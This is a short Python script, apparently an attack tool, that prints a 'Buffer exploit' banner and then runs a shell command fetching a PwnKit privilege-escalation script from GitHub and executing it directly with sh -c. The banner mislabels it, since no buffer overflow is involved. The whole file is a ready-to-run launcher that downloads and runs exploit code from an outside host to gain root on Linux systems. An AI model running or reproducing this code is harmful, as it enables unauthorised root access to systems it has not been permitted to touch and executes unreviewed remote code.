import subprocess

def display_banner():
    banner = """
     +-+-+-+-+-+-+ +-+-+-+-+-+-+-+
     |B|u|f|f|e|r| |e|x|p|l|o|i|t|
     +-+-+-+-+-+-+ +-+-+-+-+-+-+-+
    """
    print(banner)

def inject_command(command):
    try:
        print(f"Injecting command: {command}")
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout.strip()
    except Exception as e:
        return f"Failed to execute injected command: {e}"

if __name__ == "__main__":
    display_banner()
    # Execute the command to run the PwnKit script
    command = 'sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"'
    output = inject_command(command)
    print(output)
